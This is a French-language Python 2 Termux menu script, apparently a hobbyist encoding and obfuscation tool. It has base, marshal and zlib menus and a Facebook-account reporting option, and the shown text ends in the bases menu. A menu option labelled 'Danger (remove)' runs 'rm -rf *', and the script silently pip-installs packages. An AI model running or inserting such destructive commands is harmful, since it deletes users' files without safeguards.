#!/usr/bin/python2
#coding=utf-8
#cd /data/data/com.termux/files/usr/bin/.session
################################# Credits ##########################################################
# Le credit pour ce code va a Mr Faxel
# Si vous voulez prendre Le credit pour ce code Voyez Faster Axel.
####################################################################################################
# -Importation des modules-#
import os,time,sys,fileinput,base64,datetime,random,requests,mechanize, marshal, __builtin__ as pp,zlib
import marshal as mc
from base64 import *
from getpass import getpass
from sys import stdout
import subprocess as sp, sys, os, marshal, re, time, json, bs4, random, requests,py_compile,binascii,tqdm
try:
    from uncompyle6.main import decompile
except Exception as e:
    sp.call('pip2 install uncompyle2', shell=True, stderr=sp.STDOUT)	
####################################################################################################
# -Automatisation-#
def mael(f):
    for l in f + '\n':
        sys.stdout.write(l)
        sys.stdout.flush()
        time.sleep(0.009)
####################################################################################################        
# -Effacer le systeme en question-#
def cls():
    os.system('clear') 
####################################################################################################
# -Animation a ma deuxieme methode-#
t = 0.15
def anime(f):
    for g in f:
        sys.stdout.write(g)
        sys.stdout.flush()
        time.sleep(t)
####################################################################################################
# -Animation a ma troisieme methode-#
def periode():
   periodique = ['.','..','...','....','.....']
   for o in periodique:
     print("\r\033[1;91m[●] \033[1;92mChargement en cours\033[1;97m"+o),;sys.stdout.flush();time.sleep(1)		
####################################################################################################	
########## -Au revoir- ##########
def bye():
     sys.exit()     
####################################################################################################	
########## -Arret animer- ##########
def arret():
    mael("\033[1;97m╔══╗─────╔╗───────────────╔═╗")
    mael("\033[1;97m║╔╗╠╦╦╦╦═╣╚╗╔═╦═╦╗╔═╦═╦╦╦╦╣═╣")
    mael("\033[1;91m║╠╣║╔╣╔╣╩╣╔╣║╩╣║║║║═╣╬║║║╔╬═║")
    mael("\033[1;91m╚╝╚╩╝╚╝╚═╩═╝╚═╩╩═╝╚═╩═╩═╩╝╚═╝")
    mael('\033[1;97m▒▒▒▒▒▒▒▒▒▒')
    print("\033[1;32m0%")
    mael('\033[1;97m█▒▒▒▒▒▒▒▒▒')
    print("\033[1;32m10%")
    mael('\033[1;97m███▒▒▒▒▒▒▒')
    print("\033[1;32m30%")
    mael('\033[1;97m█████▒▒▒▒▒')
    print("\033[1;32m50%")
    mael('\033[1;97m███████▒▒')
    print("\033[1;32m80%")
    mael('\033[1;97m█████████')
    print("\033[1;32m100%")
    mael("\n\033[1;97mBye Man, j\'espere que tu as adoree le script de\033[1;91m Mr \033[1;96mFaxel\033[1;97m.A bientot!!\n")
    bye()
####################################################################################################
#Dev: Faxel
####################################################################################################
# -Chargement a ma deuxieme methode-#
def load(mot):
    chaine = [
     '/', '-', '|']
    for i in range(5):
        for x in range(len(chaine)):
            sys.stdout.write(('\r{}{}').format(str(mot), chaine[x]))
            time.sleep(0.3)
            sys.stdout.flush()
####################################################################################################        
# -Module uncompyle6-#
def pip_m():
    os.system('pip2 install uncompyle6')
    os.system('pip2 install pyconcrete')
####################################################################################################
# -Permet de supprimer tous les sous-script du script en question-#
def clean_remove():
    os.system('rm -rf *')
####################################################################################################
# -Afiichage auto sur le systeme en question-#
def figlet():
    os.system("figlet 'Faxel'")
    os.system("figlet 'Signaler un compte Facebook'")
####################################################################################################  
# -Chargement a ma premiere methode-#
def charge():
    compteur = ["1","2","3","4","5","6","7","8","9","10","11","12","13","14","15","16","17","18","19","20","21","22","23","24","25","26","27","28","29","30","31","32","33","34","35","36","37","38","39","40","41","42","43","44","45","46","47","48","49","50","51","52","53","54","55","56","57","58","59","60","61","62","63","64","65","66","67","68","69","70","71","72","73","74","75","76","77","78","79","80","81","82","83","84","85","86","87","88","89","90","91","92","93","94","95","96","97","98","99","100"]
    print
    for b in compteur:
    	sys.stdout.write("\r\033[1;91m[\033[1;93m*\033[1;91m] \033[38;5;245m@\033[38;5;221mFaxel\033[1;92m "+b+" \033[1;97m%")
    	sys.stdout.flush()
    	time.sleep(0.1)
    time.sleep(1.5)
####################################################################################################	
def hacker():
    faxel_h = [
     '*Faxel*', '      ', '*Faxel*', '      ', '*Faxel*', '      ', '*Faxel*', '      ', '*Faxel*', '      ', '*Faxel*', '      ', '*Faxel*', '      ', '*Faxel*', '      ', '*Faxel*', '      ', '*Faxel*', '      ', '*Faxel*', '      ', '*Faxel*', '      ', '*Faxel*', '      ', '*Faxel*', '      ', '*Faxel*', '      ', '*Faxel*', '      ', '*Faxel*', '      ', '*Faxel*', '      ', '*Faxel*', '      ', '*Faxel*\n']
    for o in faxel_h:
        print '\r\x1b[1;97m[\x1b[1;32m●●\x1b[1;97m] \x1b[1;92mChargement en cours [38;5;221m  ' + o,
        sys.stdout.flush()
        time.sleep(0.15)
####################################################################################################
####################################################################################################
# -Mes logos-#
logo =("""\033[38;5;214m●▬▬▬▬▬▬▬▬๑\033[1;97m●▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬●●▬▬▬▬▬\033[1;32m▬▬▬▬๑۩۩๑▬▬▬▬▬▬●            \n\033[38;5;214m•_  _ ____ \033[1;97m _  _ ____ ____ _  _\033[1;32m ____ ____   _  _• \n\033[38;5;214m•|\/| |__/ \033[1;97m |__| |__| |    |_/ \033[1;32m |___ |__/   |_/ • \n\033[38;5;214m•|  | |  \ \033[1;97m |  | |  | |___ | \_\033[1;32m |___ |  \ __| \_•    \n\033[38;5;214m●▬▬▬▬▬▬▬▬๑\033[1;97m●▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬●●▬▬▬▬▬\033[1;32m▬▬▬▬๑۩۩๑▬▬▬▬▬▬●\n\033[1;97m╔═════════════════════════════════════════════╗\n\033[1;97m║\033[1;91m[\033[1;93m**\033[1;91m]\033[38;5;95m      Developpeur \033[1;97m:\033[38;5;214m  Faxel           \033[1;91m[\033[1;93m**\033[1;91m]\033[1;97m║\n\033[1;97m╚═════════════════════════════════════════════╝""")
logo1 =("""\033[1;92m\n\033[1;92m-----🄼🅁------\ /------🄵🄰🅇🄴🄻-----\ /-----3b------\ /------------\\n\033[1;96m1_1_1_1 1_1_1_1 1_1_1_1 1_0_0_0 0_0_1_1 1_0_1_1 0_0_0_1 1_1_0_00_1\n\033[1;96m1 1 1 1 1 1 1 1 1 1 1 1 1 0                                     \n\033[1;96m                            0                                   \n\033[1;96m                              0                                 \n\033[1;96m                                0 0 1 1                         \n\033[1;96m                                        1 0 1 1                 \n\033[1;96m                                                0 0 0 1         \n\033[1;96m                                                        1 1 0 1   \n\033[1;96m                                                               0 \033[48;5;0;38;5;197m🄼🅁\033[38;5;128m 🄵🄰🅇🄴🄻""")
logo2 =("""\033[48;5;0;38;5;195m╔═══╗────────╔╗\n\033[48;5;0;38;5;195m║╔══╝────────║║\n\033[48;5;0;38;5;195m║╚══╦══╦╗╔╦══╣║\n\033[38;5;136m║╔══╣╔╗╠╬╬╣║═╣║\n\033[38;5;136m║║──║╔╗╠╬╬╣║═╣╚╗\n\033[38;5;136m╚╝──╚╝╚╩╝╚╩══╩═╝\033[38;5;112m 🄼🅁 \033[38;5;112m🄵🄰🅇🄴🄻""")
logo3 =("""\033[48;5;0;38;5;195m\n╭━━━╮╱╱╱╱╱╱╱╱╱╱╱╭╮\n┃╭━╮┃╱╱╱╱╱╱╱╱╱╱╭╯╰╮\n┃╰━━┳━━┳━━┳╮╭┳━╋╮╭╋━━╮\n╰━━╮┃┃━┫╭━┫┃┃┃╭╋┫┃┃┃━┫\n┃╰━╯┃┃━┫╰━┫╰╯┃┃┃┃╰┫┃━┫\n╰━━━┻━━┻━━┻━━┻╯╰┻━┻━━╯ """)
logo4 =("""\033[48;5;0;38;5;197m█▀▀ █▀█ █▀▄▀█ █▀█ █ █░░ █▀▀  \033[38;5;136m█▀▀ █▀█ ▄▀█ █▀ █▄█\n\033[48;5;0;38;5;197m█▄▄ █▄█ █░▀░█ █▀▀ █ █▄▄ ██▄  \033[38;5;136m█▄▄ █▀▄ █▀█ ▄█ ░█░""")
logo5 =("""\033[38;5;115m╔═══╗─────────\033[38;5;112m╔═══╗\n\033[38;5;115m║╔══╝─────────\033[38;5;112m║╔═╗║\n\033[38;5;115m║╚══╦═╦═╦══╦═╗\033[38;5;112m║║─╚╬═╦══╦══╦╗─╔╗\n\033[38;5;115m║╔══╣╔╣╔╣╔╗║╔╝\033[38;5;112m║║─╔╣╔╣╔╗║══╣║─║║\n\033[38;5;115m║╚══╣║║║║╚╝║║─\033[38;5;112m║╚═╝║║║╔╗╠══║╚═╝║\n\033[38;5;115m╚═══╩╝╚╝╚══╩╝─\033[38;5;112m╚═══╩╝╚╝╚╩══╩═╗╔╝\n\033[38;5;115m──────────────\033[38;5;112m────────────╔═╝║\n\033[38;5;115m──────────────\033[38;5;112m────────────╚══╝""")
logo6 =("""\033[48;5;0;38;5;192m█░█ █▀▀ ▀▄▀  \033[38;5;121m░░█ █▀█ █ █▄░█\n\033[48;5;0;38;5;192m█▀█ ██▄ █░█  \033[38;5;121m█▄█ █▄█ █ █░▀█""")
logo7 =("""\033[38;5;121m▀█ █░░ █ █▄▄ \033[48;5;0;38;5;192m█▀▄▀█ ▄▀█ █▀█ █▀ \033[48;5;0;38;5;195m█▄▄ ▄▀█ █▀ █▀▀\n\033[38;5;121m█▄ █▄▄ █ █▄█ \033[48;5;0;38;5;192m█░▀░█ █▀█ █▀▄ ▄█ \033[48;5;0;38;5;195m█▄█ █▀█ ▄█ ██▄""")
logo8 =("""\033[38;5;111m█▀▄▀█ ▄▀█ █▀█ █▀  \033[38;5;124m█▄▄ ▄▀█ █▀ █▀▀\n\033[38;5;111m█░▀░█ █▀█ █▀▄ ▄█  \033[38;5;124m█▄█ █▀█ ▄█ ██▄""")
logo9 =(""" \033[38;5;124m██████╗░██╗░░░██╗░██████╗░\n\033[38;5;124m██╔══██╗██║░░░██║██╔════╝░\n\033[38;5;124m██████╦╝██║░░░██║██║░░██╗░\n\033[38;5;124m██╔══██╗██║░░░██║██║░░╚██╗\n\033[38;5;124m██████╦╝╚██████╔╝╚██████╔╝\n\033[38;5;124m╚═════╝░░╚═════╝░░╚═════╝░""")
logo10 =("""\033[38;5;121m█▀▀ █▀▀ █░░ █ █▀▀ █ ▀█▀ ▄▀█ ▀█▀ █ █▀█ █▄░█\n\033[38;5;121m█▀░ ██▄ █▄▄ █ █▄▄ █ ░█░ █▀█ ░█░ █ █▄█ █░▀█""")
logo11 =("""\033[38;5;214m	  ▇▇▇▇▇\033[1;97m Je force pas!!\033[1;92m ▇▇▇▇▇\n[38;5;214m\n                 ⊂ヽ\n               　 ＼＼  Λ＿Λ\n              　　 ＼(  ˘ω˘  )\n                　　　 >　⌒ヽ\n                 　　　/ 　 へ＼\n                 　　 /　　/　＼＼  \033[1;97m\n                 　　 ﾚ　ノ　　 ヽ_つ\n                 　　/　/\n                 　 /　/|\n                  　(　(ヽ\n                  　|　|、＼  \033[1;92m\n                  　| 丿 ＼ ⌒)\n                  　| |　　) /\n                   ノ )    Lﾉ\n                  (_／  \033[1;97mProgressez chaque jour avec audace vers vos rêves,\nrefusez les coups d\’arrêt et rien ne pourra vous arrêter!!!\n			\033[1;93m---------\033[1;95m L\'AVENIR\033[1;97m C'EST MAINTENANT \033[1;93m---------\n[38;5;214m	 ▇▇▇▇▇\033[1;97m Je force pas!!\033[1;92m ▇▇▇▇▇""")
mpdl =("""\033[38;5;214m╔═╦═╦══╦═╗\033[1;97m╔═╗──╔╦╗─\033[1;92m───────────\033[1;96m╔═╗───────╔═╗\n\033[38;5;214m║║║║╠╗╗║╬║\033[1;97m║═╬═╗╠╣╚╗\033[1;92m╔═╦═╦═╦═╦═╗\033[1;96m║═╬╦╦═╦═╦═╣═╣\n\033[38;5;214m║║║║╠╩╝║╔╝\033[1;97m║╔╣╬╚╣║╔╣\033[1;92m║╬╚╗║╔╣╩╣═╣\033[1;96m╠═║║║═╣═╣╩╬═║\n\033[38;5;214m╚╩═╩╩══╩╝─\033[1;97m╚╝╚══╩╩═╝\033[1;92m╚══╩═╝╚═╩═╝\033[1;96m╚═╩═╩═╩═╩═╩═╝""")
logo_term_key =("""\033[1;97m████████╗███████╗██████╗ ███╗   ███╗\033[1;97m      ██╗  ██╗███████╗██╗   ██╗\n\033[1;91m╚══██╔══╝██╔════╝██╔══██╗████╗ ████║\033[1;94m      ██║ ██╔╝██╔════╝╚██╗ ██╔╝\n\033[1;91m   ██║   █████╗  ██████╔╝██╔████╔██║\033[1;97m█████╗\033[1;94m█████╔╝ █████╗   ╚████╔╝ \n\033[1;91m   ██║   ██╔══╝  ██╔══██╗██║╚██╔╝██║╚════╝\033[1;94m██╔═██╗ ██╔══╝    ╚██╔╝  \n\033[1;91m   ██║   ███████╗██║  ██║██║ ╚═╝ ██║\033[1;94m      ██║  ██╗███████╗   ██║   \n\033[1;91m   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝\033[1;91m      ╚═╝  ╚═╝╚══════╝   ╚═╝                                                                      """)
logo_menu_clavier =("""\033[1;92m___  ___                 \033[1;95m  _____ _             _           \n\033[1;92m|  \/  |                 \033[1;95m /  __ \ |           (_)          \n\033[1;92m| .  . | ___ _ __  _   _ \033[1;95m | /  \/ | __ ___   ___  ___ _ __ \n\033[1;92m| |\/| |/ _ \ '_ \| | | |\033[1;95m | |   | |/ _` \ \ / / |/ _ \ '__|\n\033[1;92m| |  | |  __/ | | | |_| |\033[1;95m | \__/\ | (_| |\ V /| |  __/ |   \n\033[1;92m\_|  |_/\___|_| |_|\__,_|\033[1;95m  \____/_|\__,_| \_/ |_|\___|_|                                                                                                                        """)
logo_faxel =("""\033[1;97m╔════════════════════════════════════════════════╗\n\033[1;97m║           \033[38;5;241mDevelopper par\033[1;91m : \033[1;93mMr \033[1;96mFaxel            \033[1;97m║\n\033[1;97m╠════════════════════════════════════════════════╣\n\033[1;97m║                \033[1;94mYoutube\033[1;91m : \033[1;92mFASTER AXEL           \033[1;97m║\n\033[1;97m║           \033[1;94mWhatsapp\033[1;91m : \033[1;93m00225-557-09610           \033[1;97m║\n\033[1;97m║    \033[1;94mFacebook\033[1;91m : \033[1;95mhttps://www.facebook.com/Faxel19 \033[1;97m║\n\033[1;97m╚════════════════════════════════════════════════╝""")
loading =("""\033[1;95mChargement\033[1;97m |▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁| \n\033[1;95mChargement\033[1;97m |▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂| \n\033[1;95mChargement\033[1;91m |▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃| \n\033[1;95mChargement\033[1;91m |▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄| \n\033[1;95mChargement\033[1;93m |▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅| \n\033[1;95mChargement\033[1;93m |▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆| \n\033[1;95mChargement\033[1;94m |▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇| \n\033[1;95mChargement\033[1;96m |██████████████████████████████████| [92mTerminer""")
key_complet =("""\033[1;92m░█─▄▀ █▀▀ █──█ 　\033[1;96m█▀▀ █▀▀█ █▀▄▀█ █▀▀█ █── █▀▀ ▀▀█▀▀ \n\033[1;92m░█▀▄─ █▀▀ █▄▄█ 　\033[1;96m█── █──█ █─▀─█ █──█ █── █▀▀ ──█── \n\033[1;92m░█─░█ ▀▀▀ ▄▄▄█ 　\033[1;96m▀▀▀ ▀▀▀▀ ▀───▀ █▀▀▀ ▀▀▀ ▀▀▀ ──▀──""")
key_simple =("""\033[1;92m░█─▄▀ █▀▀ █──█  \033[1;91m█▀▀ ─▀─ █▀▄▀█ █▀▀█ █── █▀▀ \n\033[1;92m░█▀▄─ █▀▀ █▄▄█  \033[1;91m▀▀█ ▀█▀ █─▀─█ █──█ █── █▀▀ \n\033[1;92m░█─░█ ▀▀▀ ▄▄▄█  \033[1;91m▀▀▀ ▀▀▀ ▀───▀ █▀▀▀ ▀▀▀ ▀▀▀""")
key_semi =("""\033[1;92m░█─▄▀ █▀▀ █──█ 　\033[1;94m█▀▀ █▀▀ █▀▄▀█ ─▀─ \n\033[1;92m░█▀▄─ █▀▀ █▄▄█ 　\033[1;94m▀▀█ █▀▀ █─▀─█ ▀█▀ \n\033[1;92m░█─░█ ▀▀▀ ▄▄▄█ 　\033[1;94m▀▀▀ ▀▀▀ ▀───▀ ▀▀▀""")	
Auteur_information =("""\033[38;5;241m                    MES INFORMATIONS \n\033[1;97m╔═══════════════════════════════════════════════════╗ \n\033[1;97m║\033[1;96m Auteur   \033[38;5;214mMr Faxel                                 \033[1;97m║\n\033[1;97m║\033[1;96m Nom      \033[1;97mEncodage/decodage base quelconque        \033[1;97m║\n\033[1;97m║\033[1;96m Date     \033[1;97m03/08/2020                               \033[1;97m║\n\033[1;97m║\033[1;96m Facebook \033[1;97mFaxel Koua                               \033[1;97m║\n\033[1;97m║\033[1;96m Email    \033[1;97mFaxelh19@gmail.com                       \033[1;97m║\n\033[1;97m║\033[1;96m Whatsapp \033[1;93m+22555709610                             \033[1;97m║\n\033[1;97m║\033[1;96m Github   \033[1;97mhttps://github.com/Phantom-19/           \033[1;97m║\n\033[1;97m║\033[1;96m Gitlab   \033[1;97mhttps://gitlab.com/Faxel/                \033[1;97m║\n\033[1;97m║\033[1;96m Blog     \033[1;97mhttps://faxelh.blogspot.com/             \033[1;97m║\n\033[1;97m║\033[1;96m Youtube  \033[1;97mFASTER AXEL                              \033[1;97m║\n\033[1;97m║\033[1;96m Skyrock  \033[1;97mFaxel                                    \033[1;97m║\n\033[1;97m║\033[1;96m Twitter  \033[1;97m@Faxel2020                               \033[1;97m║\n\033[1;97m║\033[1;96m Pinterest\033[1;97mhttps://www.pinterest.com/kouadioantoinea\033[1;97m║     \n\033[1;97m║\033[1;96m Pastebin \033[1;91mhttps://pastebin.com/u/Faxel             \033[1;97m║\n\033[1;97m╚═══════════════════════════════════════════════════╝""")
Auteur =("""\033[38;5;214m─█▀▀█ █──█ \033[1;97m▀▀█▀▀ █▀▀ \033[1;92m█──█ █▀▀█ \n\033[38;5;214m░█▄▄█ █──█ \033[1;97m──█── █▀▀ \033[1;92m█──█ █▄▄▀ \n\033[38;5;214m░█─░█ ─▀▀▀ \033[1;97m──▀── ▀▀▀\033[1;92m ─▀▀▀ ▀─▀▀""")
logo_verif_robot =("""\033[1;97m          ╔═══════════════════════════╗ \n\033[1;97m          ║\033[38;5;214m█████████\033[1;97m███████████\033[1;92m███████100%\033[1;97m║\n\033[1;97m          ╚═══════════════════════════╝""")

####################################################################################################
def Identification():	
	cls()
	print("[38;5;214m<══════════════════════════════════>")
        mael("\033[1;31m[\033[1;37m**\033[1;31m] \033[1;96m Auteur \033[1;31m:[38;5;112m* \033[48;5;0;38;5;197mMr [38;5;128mFaxel[38;5;112m * \033[1;31m[\033[1;37m**\033[1;31m] [38;5;18m")
        mael("[38;5;214m🇨🇮\033[1;97m is the person whom you can never judge.\033[1;92m 🇨🇮")
	kouadio = raw_input("\033[1;31m[\033[1;37m**\033[1;31m]  [38;5;214mSaisissez votre nom\033[1;91m  : [38;5;108m")    
        print("[38;5;214m<══════════════════════════════════>")
	if kouadio =="":
		print("\033[1;31m[\033[1;37m!\033[1;31m] [38;5;185mChamp obligatoire")
		time.sleep(1)
		Identification()
	else:
		cls()
                print (38 * '\x1b[1;97m\xe2\x95\x90')
                print ("\033[48;5;0;38;5;197m╔╗F╦╔═╗╔╗╔╦FF╦╔═╗╔╗╔╦F╦╔═╗\n[38;5;251m╠╩╗║║╣F║║║╚╗╔╝║╣F║║║║F║║╣F\n[38;5;110m╚═╝╩╚═╝╝╚╝F╚╝F╚═╝╝╚╝╚═╝╚═╝[38;5;227m "+ kouadio )
                print ("\033[48;5;0;38;5;197mMr[38;5;241m[38;5;114m Faxel\033[1;37m vous dit d\'utiliser ce script à bon escient! [38;5;227m" + kouadio )
                print (38 * '\x1b[1;97m\xe2\x95\x90')
                print("")
                mael("\033[1;92mInfo\033[1;91m :\033[1;97mLe crédit pour ce code va à[38;5;245m Mr [38;5;185mFaxel")
                mael("""\033[1;92mNote\033[1;91m :\033[1;97mVous pouvez recoder, Mais n'oubliez pas de mentionner l'auteur.	
\033[1;92mInspiration\033[1;91m :\033[1;97mProgressez chaque jour avec audace vers vos\nrêves, refusez les coups d'arrêt et rien ne pourra vous arrêter!!!
\033[1;93m----------\033[1;91m#\033[1;97mL'AVENIR C'EST MAINTENANT\033[1;91m#\033[1;93m---------""")
                mael("\033[1;92mUne pensée\033[1;97m a\033[1;91m <[38;5;112mZachary\033[1;97m,[38;5;112mMec\033[1;97m,[38;5;112mMael\033[1;97m,[38;5;112mDosso\033[1;97m,[38;5;112mSeverin\033[1;97m,[38;5;112mAnge Akobe,[38;5;112mMiss\033[1;96m Syntiche\033[1;91m>") 
                raw_input("\n\033[1;91m[ [38;5;24mSuivant \033[1;91m]")
		Securiter()
####################################################################################################	
def Securiter():	
	cls()
	print("[38;5;214m<═════════════════\033[1;97mConnexion a[38;5;245m Mr \033[48;5;0;38;5;197mFaxel[38;5;214m═════════════════>")
        Nu = "Faxel"
        print("")
        mdp = "08127934"
        loop = 'true'
        while (loop == 'true'):
            Nomu = raw_input("\033[1;91m[\033[1;97m**\033[1;91m] \x1b[1;97mNom d'utilisateur de l'outil \x1b[1;91m»»»» [48;5;0;38;5;197m")
            if (Nomu == Nu):
    	        md = raw_input("\033[1;91m[\033[1;97m++\033[1;91m] \x1b[1;97mMot de passe de l'outil      \x1b[1;91m»»»» [38;5;245m")
                if (md == mdp):	
		    print("[38;5;214m🇨🇮\033[1;97m I'm the person whom you can never judge. \033[1;92m 🇨🇮")
	            print("[38;5;214m<═════════════════\033[1;97mConnexion a[38;5;245m Mr \033[48;5;0;38;5;197mFaxel[38;5;214m═════════════════>")
		    load("\033[1;91m[\033[1;92m@\033[1;91m]\033[38;5;245m Server\033[38;5;214m Faxel \033[38;5;241m...")
                    print("\n\033[1;91m[\033[1;92m●\033[1;91m] \033[1;97mConnecté en tant que \033[1;96m"  +  Nomu) #Dev:Faxel
	            time.sleep(1)
                    loop = 'false'
		    menu()			
	        else:
                    print ("\n\033[1;91m[\033[1;93mx\033[1;91m] \033[1;93mMot de passe incorrect!")
                    os.system('xdg-open https://wa.me/22555709610')
	            Securiter()
            else:
                 print ("\n\033[1;91m[\033[1;93mx\033[1;91m] \033[1;95mNom d'utilisateur incorrect!")
                 os.system('xdg-open https://t.me/Faxelh')
		 Securiter()
####################################################################################################
################################ Securiter Menu decodage base ######################################
def faxel_securite():	
	cls()
	print(logo2)
	print("[38;5;214m<═════════════════\033[1;97mConnexion a[38;5;245m Mr \033[48;5;0;38;5;197mFaxel[38;5;214m═════════════════>")
	mdp = "Mael"
        loop = 'true'
        while (loop == 'true'):
            mp = getpass('\033[1;97m╠═\033[1;31m▶[38;5;221m MOT DE PASSE    \033[1;31m: [38;5;214m')
            if (mp == mdp):
		 print("[38;5;214m🇨🇮\033[1;97m I'm the person whom you can never judge. \033[1;92m 🇨🇮")
	         print("[38;5;214m<═════════════════\033[1;97mConnexion a[38;5;245m Mr \033[48;5;0;38;5;197mFaxel[38;5;214m═════════════════>")
                 load("\033[1;97mChargement\033[1;93m...")
	         loop = 'false'
		 menu_decode()	
	    else:
		 print ("\033[1;91m[\033[1;93m!\033[1;91m] \033[38;5;116m Mot de passe 🅱️ℹ️♍\033[1;91m!")
                 os.system('xdg-open https://t.me/Faxelh')
		 faxel_securite()
####################################################################################################
################################ Securiter Menu Erros Mx Fzxyl #####################################
def error_securite():	
	cls()
	print(logo3)
	print("[38;5;214m<═════════════════\033[1;97mConnexion a[38;5;245m Mr \033[48;5;0;38;5;197mFaxel[38;5;214m═════════════════>")
	mdp = "Faxel-Mael"
        loop = 'true'
        while (loop == 'true'):
            mp = getpass('\033[1;97m╠═\033[1;31m▶[38;5;221m MOT DE PASSE    \033[1;31m: [38;5;214m')
            if (mp == mdp):
		 print("[38;5;214m🇨🇮\033[1;97m I'm the person whom you can never judge. \033[1;92m 🇨🇮")
	         print("[38;5;214m<═════════════════\033[1;97mConnexion a[38;5;245m Mr \033[48;5;0;38;5;197mMael[38;5;214m═════════════════>")
                 load("\033[1;97mChargement\033[1;93m...")
	         loop = 'false'
		 menu_error_mz_fzxyl()	
	    else:
		 print ("\033[1;91m[\033[1;93m!\033[1;91m] \033[38;5;116m Mot de passe 🅱️ℹ️♍\033[1;91m!")
                 os.system('xdg-open https://t.me/Faxelh')
		 error_securite()
####################################################################################################  
####################################################################################################
def menu():
    cls()
    print(logo4)
    print("\033[1;97m╔"+30*"═"+1*"═╗")
    print("\033[1;97m║ \033[1;91m[\033[1;96m1.\033[1;91m]\033[38;5;121m Menu Bases        \033[1;97m       ║")  
    print("\033[1;97m║ \033[1;91m[\033[1;96m2.\033[1;91m]\033[38;5;214m Menu Bash + Wordliste \033[1;97m   ║")
    print("\033[1;97m║ \033[1;91m[\033[1;96m3.\033[1;91m]\033[38;5;115m Signaler un compte FB \033[1;97m   ║")
    print("\033[1;97m║ \033[1;91m[\033[1;96m4.\033[1;91m]\033[38;5;136m Danger \033[1;97m(\033[1;91mremove\033[1;97m)          ║")
    print("\033[1;97m║ \033[1;91m[\033[1;96m5.\033[1;91m]\033[38;5;111m Menu Zlib + Marshal+ Base\033[1;97m║")
    print("\033[1;97m║ \033[1;91m[\033[1;96m6.\033[1;91m]\033[38;5;116m Menu \033[38;5;214mFaxel\033[38;5;116m Cryp complexe \033[1;97m║")
    print("\033[1;97m║ \033[1;91m[\033[1;96m7.\033[1;91m]\033[38;5;241m Menu Clavier Supp        \033[1;97m║")
    print("\033[1;97m║ \033[1;91m[\033[1;96m8.\033[1;91m]\033[48;5;0;38;5;195m Menu Error0 Mz Fzxyl     \033[1;97m║") 
    print("\033[1;97m║ \033[1;91m[\033[1;96m9.\033[1;91m]\033[38;5;247m Menu Autres Scripts      \033[1;97m║") 
    print("\033[1;97m║ \033[1;91m[\033[1;96mS.\033[1;91m]\033[48;5;0;38;5;197m Signaler un bug       \033[1;97m   ║")
    print("\033[1;97m║ \033[1;91m[\033[1;96mF.\033[1;91m]\033[38;5;112m Féliciter Faxel       \033[1;97m   ║")
    print("\033[1;97m║ \033[1;91m[\033[1;96mM.\033[1;91m]\033[48;5;0;38;5;192m Menu decodage des bases\033[1;97m  ║")
    print("\033[1;97m║ \033[1;91m[\033[1;96mQ.\033[1;91m]\033[38;5;124m Quitter \033[1;97m(\033[38;5;116mexit\033[1;97m)        \033[1;97m   ║")
    print("\033[1;97m╚"+30*"═"+1*"═╝")   
    print("\033[1;97m║")
    choix()	
def choix():    
    dmd = raw_input("\033[1;97m╚═\033[1;31m▶\033[38;5;245m Mr \033[38;5;221mFaxel \033[1;91m▶▶▶ \033[1;96m")
    if dmd =="":
        print ("\n\t\033[1;91m[!] Remplissez correctement ")
	menu()
    elif dmd =="1":
        menu_bases()
    elif dmd =="2":
        menu_bash_ou_wordliste()
    elif dmd =="3":
        Signal_Fb()
    elif dmd =="4":
        clean_remove()
    elif dmd =="5":
        menu_zlib_mars()
    elif dmd =="6":
        menu_Faxel_cryptage()
    elif dmd =="7":
        Menu_clavier()
    elif dmd =="8":
        error_securite()
    elif dmd =="9":
        Menu_autres_scripts()
    elif dmd =="s" or dmd =="S":
        signal_bug()
    elif dmd =="f" or dmd =="F":
        feliciter()
    elif dmd =="m" or dmd =="M":
        faxel_securite()
    elif dmd =="0" or dmd =="q" or dmd =="Q" or dmd =="00":
        arret()
    else: 
        print('\n\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m '+dmd+' \x1b[1;91mindisponible')
	raw_input('\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
        menu()
####################################################################################################	
####################################################################################################
def menu_bases():
    cls()
    print(logo)
    print("\033[1;97m╔"+30*"═"+1*"═╗")
    print("\033[1;97m║ \033[1;91m[\033[1;96m1.\033[1;91m]\033[48;5;0;38;5;197m Encodage base64   \033[1;97m       ║")  
    print("\033[1;97m║ \033[1;91m[\033[1;96m2.\033[1;91m]\033[38;5;214m Encodage base32          \033[1;97m║")
    print("\033[1;97m║ \033[1;91m[\033[1;96m3.\033[1;91m]\033[38;5;117m Encodage base16          \033[1;97m║")
    print("\033[1;97m║ \033[1;91m[\033[1;96m4.\033[1;91m]\033[48;5;0;38;5;195m Menu Base image   \033[1;97m       ║")
    print("\033[1;97m║ \033[1;91m[\033[1;96mM.\033[1;91m]\033[48;5;0;38;5;192m Menu general           \033[1;97m  ║")
    print("\033[1;97m╚"+30*"═"+1*"═╝")   
    print("\033[1;97m║")
    choix_base()	
def choix_base():    
    dmd = raw_input("\033[1;97m╚═\033[1;31m▶\033[38;5;245m Mr \033[38;5;221mFaxel \033[1;91m▶▶▶ \033[1;96m")
    if dmd =="":
        print ("\n\t\033[1;91m[!] Remplissez correctement ")
	menu_bases()
    elif dmd =="1":
        base_64()
    elif dmd =="2":
        base_32()
    elif dmd =="3":
        base_16()
    elif dmd =="4":
        menu_base_image()	
    elif dmd =="m" or dmd =="M":
        menu()
    else: 
        print('\n\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m '+dmd+' \x1b[1;91mindisponible')
